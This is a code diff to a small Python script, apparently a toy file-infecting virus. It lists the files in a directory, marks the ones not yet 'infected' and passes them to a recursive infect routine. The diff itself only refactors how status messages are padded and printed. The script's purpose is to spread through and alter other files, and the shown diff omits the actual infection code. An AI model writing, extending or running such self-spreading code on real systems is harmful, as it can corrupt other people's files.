@@ -3,14 +3,15 @@ import os, time
 
 def search(path="."):
 	normalFiles = set() # set of uninfected file names
+	maxLength = fileLength()
 	for filename in os.listdir(path): # gets a list of file names in a given path
 		print (filename, end='')
 		if filename.startswith("infected"):
-			printSpace (filename, " Infected")
+			printSpace (filename, " Infected", maxLength)
 		elif filename == os.path.basename(__file__):
-			printSpace (filename, " Infected")
+			printSpace (filename, " Infected", maxLength)
 		else:
-			printSpace (filename, " not infected yet... Infecting...")
+			printSpace (filename, " not infected yet...", maxLength)
 			normalFiles.add(filename)
 	return normalFiles
 
@@ -23,8 +24,7 @@ def fileLength():
 			maxLength = stringLength
 	return maxLength
 
-def printSpace(filename, msg):
-	maxLength = fileLength()
+def printSpace(filename, msg, maxLength):
 	realLength = maxLength - len(filename)
 	for x in range(realLength): print (" ", end='')
 	print (" " + msg)
@@ -43,7 +43,7 @@ def infect(filelist):
 			infect(search())
 			error += 1
 		finally:
-			printSpace (filename, "Success Infected")
+			print ("    Success Infected")
 
 filelist = search()
 
